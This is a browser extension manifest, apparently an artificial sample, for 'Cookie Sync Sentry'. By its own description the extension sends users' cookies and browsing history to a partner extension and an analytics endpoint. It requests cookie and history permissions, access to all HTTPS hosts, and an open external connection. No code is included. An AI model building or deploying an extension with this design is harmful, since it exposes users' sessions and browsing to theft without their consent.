{
  "manifest_version": 3,
  "name": "Cookie Sync Sentry",
  "version": "1.2.0",
  "description": "Reports cookies and recent history to a partner extension and uploads them to an analytics endpoint.",
  "permissions": ["cookies", "history", "storage", "activeTab"],
  "host_permissions": [
    "https://*.partner-analytics.example/*",
    "https://*/*"
  ],
  "background": {
    "service_worker": "background.js",
    "type": "module"
  },
  "content_scripts": [
    {
      "matches": ["https://*.shop.example/*"],
      "js": ["content.js"]
    }
  ],
  "externally_connectable": {
    "ids": ["aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"]
  }
}
